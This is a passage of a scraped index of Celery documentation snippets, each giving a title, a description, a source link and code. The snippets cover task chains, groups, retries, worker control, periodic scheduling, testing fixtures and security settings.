celery import chain\n>>> from proj.tasks import add, mul\n\n>>> chain(add.s(4, 4) | mul.s(8))().get()\n64\n\n>>> g = chain(add.s(4) | mul.s(8))\n>>> g(4).get()\n64\n\n>>> (add.s(4, 4) | mul.s(8))().get()\n64\n```\n\n----------------------------------------\n\nTITLE: Defining Tasks for Celery Chord Example\nDESCRIPTION: Defines two tasks, add and tsum, that will be used in a chord example to perform parallel addition and then sum the results.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_51\n\nLANGUAGE: python\nCODE:\n```\n@app.task\ndef add(x, y):\n    return x + y\n\n@app.task\ndef tsum(numbers):\n    return sum(numbers)\n```\n\n----------------------------------------\n\nTITLE: Revoking Multiple Celery Tasks\nDESCRIPTION: Example showing how to revoke multiple tasks at once by providing a list of task IDs to the revoke method.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_13\n\nLANGUAGE: pycon\nCODE:\n```\n>>> app.control.revoke([\n...    '7993b0aa-1f0b-4780-9af0-c47c0858b3f2',\n...    'f565793e-b041-4b2b-9ca4-dca22762a55d',\n...    'd9d35e03-2997-42d0-a13e-64a66b88a618',\n])\n```\n\n----------------------------------------\n\nTITLE: Defining a Stateful Celery Task Reporting Progress in Python\nDESCRIPTION: Defines a Celery task that is bound to its Task instance and reports progress via update_state before returning a result. Depends on time.sleep for simulating work and requires binding (bind=True). Used for enabling task progress events to be sent back to clients. Input parameters are two integers, combining them as output after intermediate state updates.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\n@app.task(bind=True)\ndef hello(self, a, b):\n    time.sleep(1)\n    self.update_state(state=\\\"PROGRESS\\\", meta={'progress': 50})\n    time.sleep(1)\n    self.update_state(state=\\\"PROGRESS\\\", meta={'progress': 90})\n    time.sleep(1)\n    return 'hello world: %i' % (a+b)\n```\n\n----------------------------------------\n\nTITLE: Creating Celery Task Signature by Name in Python\nDESCRIPTION: Demonstrates how to create a Celery task signature object by providing the task's registered name as a string to the `celery.signature` function. This example creates a signature for the 'tasks.add' task with positional arguments (2, 2) and sets the 'countdown' execution option to 10 seconds.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_0\n\nLANGUAGE: pycon\nCODE:\n```\n>>> from celery import signature\n>>> signature('tasks.add', args=(2, 2), countdown=10)\ntasks.add(2, 2)\n```\n\n----------------------------------------\n\nTITLE: Using Celery Group for Batch Task Processing\nDESCRIPTION: Example showing how to use Celery group to process multiple tasks efficiently.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_22\n\nLANGUAGE: python\nCODE:\n```\n>>> from celery import group\n\n>>> numbers = [(2, 2), (4, 4), (8, 8), (16, 16)]\n>>> res = group(add.s(i, j) for i, j in numbers).apply_async()\n\n>>> res.get()\n[4, 8, 16, 32]\n```\n\n----------------------------------------\n\nTITLE: Inspecting Celery Task Signature Properties in Python\nDESCRIPTION: Shows how to access the properties of a created Celery signature object (`s`). It demonstrates retrieving the positional arguments (`s.args`), keyword arguments (`s.kwargs`), and execution options (`s.options`) associated with the signature.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_4\n\nLANGUAGE: pycon\nCODE:\n```\n>>> s = add.signature((2, 2), {'debug': True}, countdown=10)\n>>> s.args\n(2, 2)\n>>> s.kwargs\n{'debug': True}\n>>> s.options\n{'countdown': 10}\n```\n\n----------------------------------------\n\nTITLE: Overriding Task Methods with Annotations in Celery (Python)\nDESCRIPTION: Illustrates overriding task methods, specifically the `on_failure` handler, using the `task_annotations` setting. It defines a custom failure handler function (`my_on_failure`) and then uses a wildcard annotation to apply this handler to all tasks. This allows centralized definition of task lifecycle behaviors.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\ndef my_on_failure(self, exc, task_id, args, kwargs, einfo):\n    print('Oh no! Task failed: {0!r}'.format(exc))\n\ntask_annotations = {'*': {'on_failure': my_on_failure}}\n```\n\n----------------------------------------\n\nTITLE: Best Practice: Asynchronous Task Chains in Celery\nDESCRIPTION: This code shows the proper way to create an asynchronous workflow in Celery using task chains. This approach avoids the deadlock risks associated with synchronous subtask execution.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_44\n\nLANGUAGE: python\nCODE:\n```\ndef update_page_info(url):\n    # fetch_page -> parse_page -> store_page\n    chain = fetch_page.s(url) | parse_page.s() | store_page_info.s(url)\n    chain()\n\n@app.task()\ndef fetch_page(url):\n    return myhttplib.get(url)\n\n@app.task()\ndef parse_page(page):\n    return myparser.parse_document(page)\n\n@app.task(ignore_result=True)\ndef store_page_info(info, url):\n    PageInfo.objects.create(url=url, info=info)\n```\n\n----------------------------------------\n\nTITLE: Updating Task State in Celery Python Tasks\nDESCRIPTION: Demonstrates how to use the update_state method in a Celery task to track progress. This example shows a file upload task that updates its state with progress information that can be used to create progress bars in client applications.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_29\n\nLANGUAGE: python\nCODE:\n```\n@app.task(bind=True)\ndef upload_files(self, filenames):\n    for i, file in enumerate(filenames):\n        if not self.request.called_directly:\n            self.update_state(state='PROGRESS',\n                meta={'current': i, 'total': len(filenames)})\n```\n\n----------------------------------------\n\nTITLE: Starting Multiple Named Celery Workers (Console)\nDESCRIPTION: Demonstrates how to start multiple Celery workers on the same machine. Each worker is given a unique node name using the `-n` or `--hostname` option with hostname variables like `%h`. This example starts three workers with INFO logging and a concurrency of 10.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_2\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj worker --loglevel=INFO --concurrency=10 -n worker1@%h\n$ celery -A proj worker --loglevel=INFO --concurrency=10 -n worker2@%h\n$ celery -A proj worker --loglevel=INFO --concurrency=10 -n worker3@%h\n```\n\n----------------------------------------\n\nTITLE: Modern Celery Task Definition\nDESCRIPTION: Shows the current method of defining tasks in Celery using the @app.task decorator.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_23\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import app\n\n@app.task(queue='hipri')\ndef hello(to):\n    return 'hello {0}'.format(to)\n```\n\n----------------------------------------\n\nTITLE: Revoking Tasks in Celery\nDESCRIPTION: Examples of how to revoke Celery tasks using result objects, AsyncResult by ID, and using the app.control interface with various termination options.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_12\n\nLANGUAGE: pycon\nCODE:\n```\n>>> result.revoke()\n\n>>> AsyncResult(id).revoke()\n\n>>> app.control.revoke('d9078da5-9915-40a0-bfa1-392c7bde42ed')\n\n>>> app.control.revoke('d9078da5-9915-40a0-bfa1-392c7bde42ed',\n...                    terminate=True)\n\n>>> app.control.revoke('d9078da5-9915-40a0-bfa1-392c7bde42ed',\n...                    terminate=True, signal='SIGKILL')\n```\n\n----------------------------------------\n\nTITLE: Defining a Celery Task with Decorator Options in Python\nDESCRIPTION: Shows how to configure task behavior by passing arguments to the `@app.task` decorator. In this example, the `serializer` option is set to 'json'. Assumes a Celery application instance `app` and a Django model `User` are defined.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n@app.task(serializer='json')\ndef create_user(username, password):\n    User.objects.create(username=username, password=password)\n```\n\n----------------------------------------\n\nTITLE: Implementing Manual Retry with Custom Delay in Celery Tasks\nDESCRIPTION: Example of a Celery task with manual retry functionality that overrides the default retry delay. This task attempts to execute 'something_raising()' and retries after 1 minute if an exception occurs, despite the task being configured with a 30-minute default retry delay.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_19\n\nLANGUAGE: python\nCODE:\n```\n@app.task(bind=True, default_retry_delay=30 * 60)  # retry in 30 minutes.\ndef add(self, x, y):\n    try:\n        something_raising()\n    except Exception as exc:\n        # overrides the default delay to retry after 1 minute\n        raise self.retry(exc=exc, countdown=60)\n```\n\n----------------------------------------\n\nTITLE: Loading Celery Configuration from a Module in Python\nDESCRIPTION: This snippet shows how to tell a Celery instance to use a configuration module by calling the config_from_object method.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/first-steps-with-celery.rst#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\napp.config_from_object('celeryconfig')\n```\n\n----------------------------------------\n\nTITLE: Creating and Executing Task Chain in Celery Python\nDESCRIPTION: Demonstrates how to create and execute a chain of tasks using the chain class in Celery. It also shows how to access intermediate results in the chain.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_42\n\nLANGUAGE: python\nCODE:\n```\n>>> from celery import chain\n>>> from proj.tasks import add, mul\n\n>>> # (4 + 4) * 8 * 10\n>>> res = chain(add.s(4, 4), mul.s(8), mul.s(10))\nproj.tasks.add(4, 4) | proj.tasks.mul(8) | proj.tasks.mul(10)\n```\n\nLANGUAGE: python\nCODE:\n```\n>>> res = chain(add.s(4, 4), mul.s(8), mul.s(10))()\n>>> res.get()\n640\n```\n\nLANGUAGE: python\nCODE:\n```\n>>> res.parent.get()\n64\n\n>>> res.parent.parent.get()\n8\n\n>>> res.parent.parent\n<AsyncResult: eeaad925-6778-4ad1-88c8-b2a63d017933>\n```\n\n----------------------------------------\n\nTITLE: Scheduling Celery Task Hourly Divisible by 5 using Crontab\nDESCRIPTION: This Python snippet demonstrates how to configure a Celery task to run every hour that is divisible by 5 (e.g., 00:00, 05:00, 10:00, 15:00, 20:00) using the `celery.schedules.crontab` function. The task runs at minute 0 of the specified hours.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/periodic-tasks.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\ncrontab(minute=0, hour='*/5')\n```\n\n----------------------------------------\n\nTITLE: Purging Celery Task Queues\nDESCRIPTION: Commands and code examples for purging tasks from Celery queues using both command line and programmatic approaches.\nSOURCE: https://github.com/celery/celery/blob/main/docs/faq.rst#2025-04-23_snippet_2\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj purge\n```\n\nLANGUAGE: pycon\nCODE:\n```\n>>> from proj.celery import app\n>>> app.control.purge()\n1753\n```\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj amqp queue.purge <queue name>\n```\n\n----------------------------------------\n\nTITLE: Using Partial Celery Signatures with Arguments in Python\nDESCRIPTION: Illustrates the concept of partial signatures. An incomplete signature `add.s(2)` is created. When `delay(4)` or `apply_async((4,))` is called on this partial, the new argument `4` is prepended to the original argument `2`, resulting in the task being called as `add(4, 2)`.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_11\n\nLANGUAGE: pycon\nCODE:\n```\n>>> partial = add.s(2)          # incomplete signature\n>>> partial.delay(4)            # 4 + 2\n>>> partial.apply_async((4,))  # same\n```\n\n----------------------------------------\n\nTITLE: Using Custom Task Base Class per Task\nDESCRIPTION: Shows how to use a custom base Task class for an individual task using the base parameter of the task decorator. This example uses the DatabaseTask class to provide database access to the task.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_39\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.app import task\n\n@app.task(base=DatabaseTask, bind=True)\ndef process_rows(self: task):\n    for row in self.db.table.all():\n        process_row(row)\n```\n\n----------------------------------------\n\nTITLE: Defining Retry Configuration in Class-Based Celery Tasks\nDESCRIPTION: Example of configuring retry parameters in a class-based Celery task. This approach allows defining retry behavior that can be inherited by multiple task classes, providing a consistent retry strategy across related tasks.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_25\n\nLANGUAGE: python\nCODE:\n```\nclass BaseTaskWithRetry(Task):\n    autoretry_for = (TypeError,)\n    max_retries = 5\n    retry_backoff = True\n    retry_backoff_max = 700\n    retry_jitter = False\n```\n\n----------------------------------------\n\nTITLE: Configuring Periodic Tasks with beat_schedule Setting in Celery (Python)\nDESCRIPTION: This snippet configures periodic tasks using the `beat_schedule` setting directly on the Celery app configuration. The snippet shows the complete dictionary structure for registering a recurring task (`tasks.add`) with execution every 30 seconds and arguments passed to the task. Set `app.conf.timezone` as appropriate. All settings must be applied to the Celery app before workers and the beat process are started. Celery must be installed and initialized beforehand.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/periodic-tasks.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\napp.conf.beat_schedule = {\n    'add-every-30-seconds': {\n        'task': 'tasks.add',\n        'schedule': 30.0,\n        'args': (16, 16)\n    },\n}\napp.conf.timezone = 'UTC'\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Task Router Function in Celery Python\nDESCRIPTION: Example of a custom routing function that can be used with task_routes to dynamically route tasks based on task name or other parameters.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_39\n\nLANGUAGE: python\nCODE:\n```\ndef route_task(self, name, args, kwargs, options, task=None, **kw):\n    if task == 'celery.ping':\n        return {'queue': 'default'}\n```\n\n----------------------------------------\n\nTITLE: Using Partial Celery Signatures with Keyword Arguments in Python\nDESCRIPTION: Demonstrates how keyword arguments provided when calling `delay` or `apply_async` on a signature are merged with the signature's existing keyword arguments. New keyword arguments take precedence over existing ones.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_12\n\nLANGUAGE: pycon\nCODE:\n```\n>>> s = add.s(2, 2)\n>>> s.delay(debug=True)                    # -> add(2, 2, debug=True)\n>>> s.apply_async(kwargs={'debug': True})  # same\n```\n\n----------------------------------------\n\nTITLE: Handling Soft Time Limits in Celery Tasks\nDESCRIPTION: Demonstrates how to catch SoftTimeLimitExceeded exceptions to perform cleanup operations before the hard time limit is reached. This allows graceful handling of time-limited tasks.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_11\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.exceptions import SoftTimeLimitExceeded\n\n@app.task\ndef mytask():\n    try:\n        return do_work()\n    except SoftTimeLimitExceeded:\n        cleanup_in_a_hurry()\n```\n\n----------------------------------------\n\nTITLE: Using celery_app and celery_worker Pytest Fixtures for Integration Testing\nDESCRIPTION: Illustrates how to use the `celery_app` and `celery_worker` pytest fixtures for integration tests. A simple task `mul` is defined using the `celery_app` fixture, the `celery_worker` is reloaded to pick up the new task, the task is executed asynchronously using `.delay()`, and the result is retrieved synchronously using `.get()`.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/testing.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\ndef test_create_task(celery_app, celery_worker):\n    @celery_app.task\n    def mul(x, y):\n        return x * y\n    \n    celery_worker.reload()\n    assert mul.delay(4, 4).get(timeout=10) == 16\n```\n\n----------------------------------------\n\nTITLE: Setting Up Task Logging in Celery with Python\nDESCRIPTION: Best practice for creating a logger for Celery tasks using get_task_logger. This automatically includes task name and ID in log messages.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_14\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.utils.log import get_task_logger\n\nlogger = get_task_logger(__name__)\n\n@app.task\ndef add(x, y):\n    logger.info('Adding {0} + {1}'.format(x, y))\n    return x + y\n```\n\n----------------------------------------\n\nTITLE: Routing Celery Tasks in Python Configuration\nDESCRIPTION: This snippet shows how to route a specific task to a dedicated queue using the task_routes setting in the Celery configuration file.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/first-steps-with-celery.rst#2025-04-23_snippet_13\n\nLANGUAGE: python\nCODE:\n```\ntask_routes = {\n    'tasks.add': 'low-priority',\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing and Setting Celery App Configuration Values in Python Interactive Shell\nDESCRIPTION: Shows how to retrieve and update settings on a Celery app via the conf attribute interactively. Useful for inspecting or modifying runtime configuration such as time zone or UTC enabling. Dependencies: existing app object and valid Celery installation. Setting values is immediate and affects the running instance. The example illustrates both attribute-style and method-based updates.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_5\n\nLANGUAGE: pycon\nCODE:\n```\n>>> app.conf.timezone\n'Europe/London'\n```\n\nLANGUAGE: pycon\nCODE:\n```\n>>> app.conf.enable_utc = True\n```\n\n----------------------------------------\n\nTITLE: Defining Class-Based Tasks with Retry Attributes in Celery 4.4\nDESCRIPTION: Demonstrates how to define a class-based task in Celery 4.4 with retry attributes including autoretry_for, retry_kwargs, retry_backoff, retry_backoff_max, and retry_jitter, allowing for more control over task retry behavior.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.4.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nclass BaseTaskWithRetry(Task):\n  autoretry_for = (TypeError,)\n  retry_kwargs = {'max_retries': 5}\n  retry_backoff = True\n  retry_backoff_max = 700\n  retry_jitter = False\n```\n\n----------------------------------------\n\nTITLE: Scheduling Celery Task on Even Days of the Month using Crontab\nDESCRIPTION: This Python snippet demonstrates using `celery.schedules.crontab` to schedule a task to run at midnight (00:00) on every even-numbered day of the month, from the 2nd to the 30th.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/periodic-tasks.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\ncrontab(0, 0, day_of_month='2-30/2')\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery with Kafka Broker Settings\nDESCRIPTION: Configuration file (celeryconfig.py) that sets up Kafka broker connection with SASL_SSL authentication and related transport options. Includes settings for task serialization and connection retry behavior.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/kafka.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nimport os\n\ntask_serializer = 'json'\nbroker_transport_options = {\n    # \"allow_create_topics\": True,\n}\nbroker_connection_retry_on_startup = True\n\n# For using SQLAlchemy as the backend\n# result_backend = 'db+postgresql://postgres:example@localhost/postgres'\n\nbroker_transport_options.update({\n    \"security_protocol\": \"SASL_SSL\",\n    \"sasl_mechanism\": \"SCRAM-SHA-512\",\n})\nsasl_username = os.environ[\"SASL_USERNAME\"]\nsasl_password = os.environ[\"SASL_PASSWORD\"]\nbroker_url = f\"confluentkafka://{sasl_username}:{sasl_password}@broker:9094\"\nbroker_transport_options.update({\n    \"kafka_admin_config\": {\n        \"sasl.username\": sasl_username,\n        \"sasl.password\": sasl_password,\n    },\n    \"kafka_common_config\": {\n        \"sasl.username\": sasl_username,\n        \"sasl.password\": sasl_password,\n        \"security.protocol\": \"SASL_SSL\",\n        \"sasl.mechanism\": \"SCRAM-SHA-512\",\n        \"bootstrap_servers\": \"broker:9094\",\n    }\n})\n```\n\n----------------------------------------\n\nTITLE: Creating Complex Workflow with Groups in Celery Python\nDESCRIPTION: Shows how to create a complex workflow using groups and chains, with partial arguments being forwarded to tasks in the group.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_35\n\nLANGUAGE: python\nCODE:\n```\n>>> new_user_workflow = (create_user.s() | group(\n...                      import_contacts.s(),\n...                      send_welcome_email.s()))\n... new_user_workflow.delay(username='artv',\n...                         first='Art',\n...                         last='Vandelay',\n...                         email='art@vandelay.com')\n```\n\n----------------------------------------\n\nTITLE: Creating a Celery Instance in Python\nDESCRIPTION: Demonstrates how to create a Celery instance and configure it using a configuration object or environment variable.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/app-overview.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\n>>> from celery import Celery\n>>> app = Celery()\n>>> app.config_from_object('celeryconfig')\n>>> #app.config_from_envvar('CELERY_CONFIG_MODULE')\n```\n\n----------------------------------------\n\nTITLE: Unit Testing Celery Task Failure with Mocking and Retry in Python\nDESCRIPTION: Demonstrates a unit test for the `send_order` task's failure scenario where an `OperationalError` is expected, leading to a task retry. It uses `unittest.mock.patch` to patch both `Product.order` and the task's `retry` method. `side_effect` is used on the mocks to raise `OperationalError` and `Retry` respectively. The test asserts that the `Retry` exception is raised when the task is called.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/testing.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n        @patch('proj.tasks.Product.order')\n        @patch('proj.tasks.send_order.retry')\n        def test_failure(self, send_order_retry, product_order):\n            product = Product.objects.create(\n                name='Foo',\n            )\n\n            # Set a side effect on the patched methods\n            # so that they raise the errors we want.\n            send_order_retry.side_effect = Retry()\n            product_order.side_effect = OperationalError()\n\n            with raises(Retry):\n                send_order(product.pk, 3, Decimal(30.6))\n```\n\n----------------------------------------\n\nTITLE: Inspecting Active Celery Tasks\nDESCRIPTION: Lists all tasks that are currently being executed by the workers in the cluster. Requires the Celery application instance (`-A proj`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_7\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj inspect active\n```\n\n----------------------------------------\n\nTITLE: Configuring Accepted Serializers in Celery (Python)\nDESCRIPTION: This snippet demonstrates how to use the 'accept_content' setting in a Celery configuration file to restrict workers to accepting only JSON-serialized messages. By doing so, it prevents workers from deserializing potentially dangerous or untrusted content types (such as pickle). No external dependencies are required except for a version of Celery greater than or equal to 3.0.18, when this feature was introduced. The key parameter is a list of allowed serializers or content types. This hardening reduces the attack surface for code execution via maliciously crafted tasks.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/security.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\naccept_content = ['json']\n```\n\n----------------------------------------\n\nTITLE: Configuring Allowed Content Types in Celery (Python)\nDESCRIPTION: Demonstrates setting the `accept_content` configuration variable in Celery. This setting defines a whitelist of allowed serializers/content types for incoming task messages, defaulting to {'json'}. Examples show configuration using both the serializer name ('json') and the full MIME type ('application/json'). Messages with types not in this list will be discarded.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n# using serializer name\naccept_content = ['json']\n\n# or the actual content-type (MIME)\naccept_content = ['application/json']\n```\n\n----------------------------------------\n\nTITLE: Listing Active Queues Programmatically\nDESCRIPTION: Python code to list active queues programmatically using the inspect interface. Shows how to use the active_queues method for all workers or specific workers.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_32\n\nLANGUAGE: pycon\nCODE:\n```\n>>> app.control.inspect().active_queues()\n[...]\n\n>>> app.control.inspect(['worker1.local']).active_queues()\n[...]\n```\n\n----------------------------------------\n\nTITLE: Enabling Authenticated Message Signing in Celery (Python)\nDESCRIPTION: This code shows how to configure a Celery app to use the 'auth' serializer, which verifies that incoming messages are signed with a trusted private key and authenticated by the worker. It sets paths for private keys and certificates, restricts all serializers to 'auth', and enforces both task and event serializer signatures. The configuration requires the 'cryptography' library and access to X.509 private keys and certificates, typically supplied by the system administrator. It also requires Celery's 'setup_security' method to be called. This setup prevents unauthorized message injection but does not encrypt message content—additional steps would be necessary for payload encryption.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/security.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\napp = Celery()\napp.conf.update(\n    security_key='/etc/ssl/private/worker.key'\n    security_certificate='/etc/ssl/certs/worker.pem'\n    security_cert_store='/etc/ssl/certs/*.pem',\n    security_digest='sha256',\n    task_serializer='auth',\n    event_serializer='auth',\n    accept_content=['auth']\n)\napp.setup_security()\n```\n\n----------------------------------------\n\nTITLE: Creating Chain Subtasks in Celery with Python\nDESCRIPTION: Demonstrates how to create a chain subtask in Celery to execute a series of operations sequentially, with access to intermediate results through parent relationships.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_3\n\nLANGUAGE: pycon\nCODE:\n```\n>>> from celery import chain\n\n# (2 + 2) * 8 / 2\n>>> res = chain(add.subtask((2, 2)),\n                mul.subtask((8,)),\n                div.subtask((2,))).apply_async()\n>>> res.get() == 16\n\n>>> res.parent.get() == 32\n\n>>> res.parent.parent.get() == 4\n```\n\n----------------------------------------\n\nTITLE: Defining Crontab-like Periodic Tasks in Celery\nDESCRIPTION: Python code examples demonstrating how to define periodic tasks in Celery using crontab-like scheduling. Shows various scheduling patterns including daily, weekly, and hourly tasks.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-1.0.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.schedules import crontab\nfrom celery.decorators import periodic_task\n\n@periodic_task(run_every=crontab(hour=7, minute=30))\ndef every_morning():\n    print('Runs every morning at 7:30a.m')\n\n@periodic_task(run_every=crontab(hour=7, minute=30, day_of_week='mon'))\ndef every_monday_morning():\n    print('Run every monday morning at 7:30a.m')\n\n@periodic_task(run_every=crontab(minutes=30))\ndef every_hour():\n    print('Runs every hour on the clock (e.g., 1:30, 2:30, 3:30 etc.).')\n```\n\n----------------------------------------\n\nTITLE: Applying Global Task Annotations via Wildcard in Celery (Python)\nDESCRIPTION: Demonstrates using a wildcard ('*') within the `task_annotations` dictionary to apply a configuration setting (here, `rate_limit` set to '10/s') to all tasks globally. This provides a way to enforce common behaviors or limits across the entire application.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\ntask_annotations = {'*': {'rate_limit': '10/s'}}\n```\n\n----------------------------------------\n\nTITLE: Connecting Handlers to Celery Task Publishing Signal in Python\nDESCRIPTION: This snippet illustrates how to connect a handler function to the after_task_publish signal in Celery. It imports after_task_publish from celery.signals and defines a function with the required signature, accessing information about the published task from the headers or body and logging the task ID. Dependencies include Celery with signals support and a running task publishing workflow. The handler receives parameters such as sender, headers, body, and any additional kwargs, and is called after any task is published, allowing for custom post-processing each time a task message is sent to the broker.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/signals.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.signals import after_task_publish\n\n@after_task_publish.connect\ndef task_sent_handler(sender=None, headers=None, body=None, **kwargs):\n    # information about task are located in headers for task messages\n    # using the task protocol version 2.\n    info = headers if 'task' in headers else body\n    print('after_task_publish for task id {info[id]}'.format(\n        info=info,\n    ))\n\n```\n\n----------------------------------------\n\nTITLE: Defining an Add Function as a Celery Task in Python\nDESCRIPTION: Defines a simple Celery task using the @app.task decorator that adds two arguments and returns their sum. This requires a valid Celery application instance bound to 'app'. The function accepts two numeric arguments and returns their sum as output.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n@app.task\ndef add(x, y):\n    return x + y\n```\n\n----------------------------------------\n\nTITLE: Creating Celery Task Signature via Task Method in Python\nDESCRIPTION: Shows an alternative way to create a Celery task signature using the `signature` method directly on the task object (`add`). This achieves the same result as creating it by name, specifying arguments `(2, 2)` and the `countdown` option.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_1\n\nLANGUAGE: pycon\nCODE:\n```\n>>> add.signature((2, 2), countdown=10)\ntasks.add(2, 2)\n```\n\n----------------------------------------\n\nTITLE: Implementing Pydantic Model Validation in Celery Tasks\nDESCRIPTION: Example of using Pydantic for argument validation and result serialization in a Celery task. This task accepts and validates a Pydantic model as input and returns another model, which gets automatically serialized to a dictionary.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_26\n\nLANGUAGE: python\nCODE:\n```\nfrom pydantic import BaseModel\n\nclass ArgModel(BaseModel):\n    value: int\n\nclass ReturnModel(BaseModel):\n    value: str\n\n@app.task(pydantic=True)\ndef x(arg: ArgModel) -> ReturnModel:\n    # args/kwargs type hinted as Pydantic model will be converted\n    assert isinstance(arg, ArgModel)\n\n    # The returned model will be converted to a dict automatically\n    return ReturnModel(value=f\"example: {arg.value}\")\n```\n\n----------------------------------------\n\nTITLE: Testing Celery Task with Session Worker in Python\nDESCRIPTION: This code snippet demonstrates how to use the celery_session_worker fixture to test a Celery task. It asserts that the 'add' task correctly adds two numbers asynchronously.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/testing.rst#2025-04-23_snippet_16\n\nLANGUAGE: Python\nCODE:\n```\ndef test_add_task(celery_session_worker):\n    assert add.delay(2, 2).get() == 4\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Control Command in Celery\nDESCRIPTION: Example of creating a custom control command that increments the task prefetch count. Uses the @control_command decorator with argument specifications.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_43\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.worker.control import control_command\n\n@control_command(\n    args=[('n', int)],\n    signature='[N=1]',  # <- used for help on the command-line.\n)\ndef increase_prefetch_count(state, n=1):\n    state.consumer.qos.increment_eventually(n)\n    return {'ok': 'prefetch count incremented'}\n```\n\n----------------------------------------\n\nTITLE: Checking Group Task Results in Celery\nDESCRIPTION: Demonstrates how to check if a group of tasks has completed and retrieve their results using GroupResult methods like ready(), successful(), and get().\nSOURCE: 